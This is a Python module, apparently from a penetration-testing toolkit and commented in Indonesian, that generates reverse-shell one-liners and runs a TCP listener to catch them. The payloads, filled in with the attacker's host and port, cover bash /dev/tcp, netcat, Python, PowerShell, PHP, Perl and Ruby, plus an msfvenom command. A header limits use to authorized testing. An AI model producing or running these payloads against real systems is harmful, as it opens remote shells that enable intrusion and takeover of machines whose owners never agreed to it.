# nexus/python/modules/listener.py
# ---------------------------------------------------------------------------
# UNTUK PENGUJIAN KEAMANAN YANG SAH (AUTHORIZED PENTESTING) SAJA.
# Gunakan hanya pada sistem/target yang Anda miliki atau yang Anda punya izin
# tertulis untuk diuji. Penggunaan tanpa izin dapat melanggar hukum.
# ---------------------------------------------------------------------------
"""
Modul Reverse Shell / Listener.

Dua submode:
  - 'payload' : menghasilkan one-liner reverse-shell siap pakai (instan, nyata).
                Mensubstitusi LHOST/LPORT ke berbagai bahasa/tooling.
  - 'listen'  : mengikat (bind) port TCP pada 0.0.0.0 dan menunggu koneksi
                masuk, lalu men-stream apa pun yang diterima sampai timeout
                (nyata, hanya memakai stdlib `socket`).

Murni Python stdlib (socket, threading). Berjalan di Windows + Linux.
Tidak ada data palsu — payload disubstitusi nyata, listener benar-benar bind.
"""
import socket

from core.stream_handler import emit_line


# Batas keamanan agar listener tidak menggantung proses terlalu lama.
_MAX_DURATION = 600          # detik
_RECV_CHUNK = 4096           # bytes per recv()
_MAX_RECEIVED_CHARS = 8000   # cap teks yang dikirim balik ke UI


def _primary_lan_ip() -> str:
    """Deteksi IP LAN utama mesin via UDP socket ke 8.8.8.8 (tanpa kirim data).

    Tidak benar-benar mengirim paket — hanya menanyakan ke OS rute keluar mana
    yang dipakai, lalu mengambil alamat lokalnya. Fallback ke '10.0.0.1'.
    """
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]
    except Exception:
        return '10.0.0.1'
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _build_payloads(lhost: str, lport: int, shell: str = 'bash') -> list:
    """Bangun daftar one-liner reverse-shell dengan LHOST/LPORT disubstitusi."""
    sh = (shell or 'bash').strip() or 'bash'
    payloads = [
        {
            'name': 'Bash -i',
            'lang': 'bash',
            'command': f'{sh} -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        },
        {
            'name': 'Bash /dev/tcp',
            'lang': 'bash',
            'command': (
                f'0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; '
                f'{sh} <&196 >&196 2>&196'
            ),
        },
        {
            'name': 'sh',
            'lang': 'sh',
            'command': f'/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        },
        {
            'name': 'Netcat (nc -e)',
            'lang': 'netcat',
            'command': f'nc -e /bin/sh {lhost} {lport}',
        },
        {
            'name': 'Netcat (mkfifo, tanpa -e)',
            'lang': 'netcat',
            'command': (
                f'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|'
                f'nc {lhost} {lport} >/tmp/f'
            ),
        },
        {
            'name': 'Python3',
            'lang': 'python',
            'command': (
                'python3 -c \'import socket,subprocess,os;'
                's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                f's.connect(("{lhost}",{lport}));'
                'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
                'os.dup2(s.fileno(),2);'
                'import pty;pty.spawn("/bin/sh")\''
            ),
        },
        {
            'name': 'Python (Windows)',
            'lang': 'python',
            'command': (
                'python -c "import socket,subprocess,os,threading;'
                's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
                f's.connect((\'{lhost}\',{lport}));'
                'p=subprocess.Popen([\'cmd.exe\'],stdin=s.fileno(),'
                'stdout=s.fileno(),stderr=s.fileno());p.wait()"'
            ),
        },
        {
            'name': 'PowerShell',
            'lang': 'powershell',
            'command': (
                'powershell -nop -c "$c=New-Object '
                f'System.Net.Sockets.TCPClient(\'{lhost}\',{lport});'
                '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
                'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
                '$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
                '$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';'
                '$sby=([text.encoding]::ASCII).GetBytes($sb2);'
                '$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"'
            ),
        },
        {
            'name': 'PHP',
            'lang': 'php',
            'command': f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        },
        {
            'name': 'Perl',
            'lang': 'perl',
            'command': (
                'perl -e \'use Socket;$i="' + lhost + '";$p=' + str(lport) + ';'
                'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                'if(connect(S,sockaddr_in($p,inet_aton($i)))){'
                'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
                'exec("/bin/sh -i");};\''
            ),
        },
        {
            'name': 'Ruby',
            'lang': 'ruby',
            'command': (
                'ruby -rsocket -e\''
                f'f=TCPSocket.open("{lhost}",{lport}).to_i;'
                'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
            ),
        },
        {
            'name': 'msfvenom (saran)',
            'lang': 'msfvenom',
            'command': (
                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} '
                f'LPORT={lport} -f elf -o shell.elf'
            ),
        },
    ]
    return payloads


def _run_payload(lhost: str, lport: str, shell: str) -> dict:
    if not (lhost or '').strip():
        lhost = _primary_lan_ip()
    try:
        lport_i = int(str(lport).strip() or '4444')
    except ValueError:
        lport_i = 4444

    emit_line('[*] Reverse Shell Payload Generator')
    emit_line('[*] HANYA untuk target yang Anda miliki / berizin (authorized testing).')
    emit_line(f'[*] LHOST={lhost}  LPORT={lport_i}')

    payloads = _build_payloads(lhost, lport_i, shell)
    emit_line(f'[+] generated {len(payloads)} payloads')

    return {
        'module': 'listener',
        'submode': 'payload',
        'lhost': lhost,
        'lport': lport_i,
        'payloads': payloads,
        'total': len(payloads),
    }


def _run_listen(port: str, duration: str) -> dict:
    try:
        port_i = int(str(port).strip() or '4444')
    except ValueError:
        port_i = 4444
    try:
        duration_i = int(str(duration).strip() or '60')
    except ValueError:
        duration_i = 60
    if duration_i < 1:
        duration_i = 1
    if duration_i > _MAX_DURATION:
        duration_i = _MAX_DURATION

    result = {
        'module': 'listener',
        'submode': 'listen',
        'port': port_i,
        'connection': None,
        'received': '',
        'bytes': 0,
        'connected': False,
    }

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port_i))
        sock.listen(1)
    except OSError as e:
        emit_line(f'[ERROR] gagal bind 0.0.0.0:{port_i} — {e}')
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass
        result['error'] = str(e)
        return result

    received_bytes = b''
    received = ''
    try:
        import time as _time

        emit_line(f'$ listening on 0.0.0.0:{port_i}')
        emit_line(f'[*] menunggu koneksi masuk (timeout {duration_i}s)...')

        deadline = _time.monotonic() + duration_i

        # accept() menghormati sisa durasi.
        sock.settimeout(max(0.5, deadline - _time.monotonic()))
        try:
            conn, addr = sock.accept()
        except socket.timeout:
            emit_line(f'[!] tidak ada koneksi dalam {duration_i}s')
            return result

        addr_str = f'{addr[0]}:{addr[1]}'
        result['connection'] = addr_str
        result['connected'] = True
        emit_line(f'[+] connection from {addr_str}')

        try:
            while True:
                remaining = deadline - _time.monotonic()
                if remaining <= 0:
                    break
                conn.settimeout(remaining)
                try:
                    data = conn.recv(_RECV_CHUNK)
                except socket.timeout:
                    break
                if not data:
                    break  # peer menutup koneksi
                received_bytes += data
                chunk = data.decode('utf-8', errors='replace')
                line = chunk.strip()
                if line:
                    emit_line(line)
                if len(received) < _MAX_RECEIVED_CHARS:
                    received += chunk
                    if len(received) > _MAX_RECEIVED_CHARS:
                        received = received[:_MAX_RECEIVED_CHARS]
        finally:
            try:
                conn.close()
            except Exception:
                pass

        result['received'] = received
        result['bytes'] = len(received_bytes)
        return result
    finally:
        try:
            sock.close()
        except Exception:
            pass


def run(submode: str = 'payload', lhost: str = '', lport: str = '4444',
        shell: str = 'bash', port: str = '4444', duration: str = '60',
        **kwargs) -> dict:
    """Entry point modul Listener.

    submode == 'payload' : hasilkan one-liner reverse-shell (instan, nyata).
    submode == 'listen'  : bind TCP port & tunggu koneksi masuk (nyata).

    Semua untuk pengujian keamanan yang SAH saja.
    """
    submode = (submode or 'payload').strip().lower()
    if submode == 'listen':
        return _run_listen(port, duration)
    return _run_payload(lhost, lport, shell)
